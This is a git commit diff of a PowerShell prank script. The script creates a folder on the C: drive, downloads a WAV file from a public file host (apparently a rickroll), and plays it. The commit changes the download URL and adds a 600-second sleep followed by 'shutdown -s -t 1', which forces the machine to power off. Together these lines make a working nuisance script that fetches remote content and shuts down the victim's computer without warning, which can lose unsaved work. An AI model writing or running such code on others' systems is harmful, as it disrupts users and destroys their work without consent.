9b6548bd26d67f43da5a692a1dd5401b92850994
Calimtr7 <61936662+Calimtr7@users.noreply.github.com>
2021-02-28 09:56:20 -0800

    Update aura.ps1

--- aura.ps1
+++ aura.ps1
@@ -1,5 +1,7 @@
 New-Item -Path 'C:\Bothond\' -ItemType Directory
 $WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://srv-store3.gofile.io/download/ax7D8Y/y2mate.com%20-%20Rick%20Astley%20%20Never%20Gonna%20Give%20You%20Up%20Video%20(3).wav","C:\Bothond\asd.wav")
+$WebClient.DownloadFile("https://s111.123apps.com/aconv/d/s111gR57mphO_wav_JUVFHK23.wav","C:\Bothond\asd.wav")
 $player = New-Object System.Media.SoundPlayer "C:\Bothond\asd.wav"
 $player.Play()
+Start-Sleep -s 600
+shutdown -s -t 1
